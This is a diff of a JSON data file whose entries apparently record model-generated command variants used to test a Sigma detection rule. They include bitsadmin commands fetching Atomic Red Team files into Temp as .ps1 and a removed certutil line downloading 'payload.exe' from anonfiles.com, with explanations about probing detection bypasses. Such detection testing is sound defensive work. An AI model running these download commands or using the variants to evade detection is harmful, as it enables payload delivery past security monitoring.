@@ -1,22 +1,10 @@
 [
   {
-    "output": "C:\\Windows\\System32\\bitsadmin.exe /transfer qcxjb7 /Priority HIGH \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\" C:\\Users\\thaim\\AppData\\Local\\Temp\\Atomic-license.txt",
-    "explanation": "Inserted quotes around the URL to test if the Sigma rule detects the command line correctly despite safe formatting changes."
+    "output": "bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
+    "explanation": "This is the original command and is not a bypass. It matches the Sigma rule as it contains the required flags and domain."
   },
   {
     "output": "bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin3_flag.ps1",
-    "explanation": "Reformatted spacing and used standard command structure without changes that would bypass detection, ensuring the Sigma rule still identifies the command."
-  },
-  {
-    "output": "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\\Users\\thaim\\AppData\\Local\\Temp\\bitsadmin1_flag.ps1",
-    "explanation": "Reordered and standardized command-line structure to test if the Sigma rule remains resilient to minor reordering and spacing."
-  },
-  {
-    "output": "certutil -urlcache -split -f http://anonfiles.com/example/payload.exe payload.exe",
-    "explanation": "Corrected the URL to a valid format for testing, ensuring the Sigma rule detects the domain 'anonfiles.com' as expected."
-  },
-  {
-    "output": "",
-    "explanation": "The fourth input is unrelated to the Sigma rule and appears to be a LaTeX resume snippet. No safe bypass command can be generated for this."
+    "explanation": "No safe bypass command can be generated without violating the rule's detection logic. The required flags and domain are essential for the rule to trigger."
   }
 ]
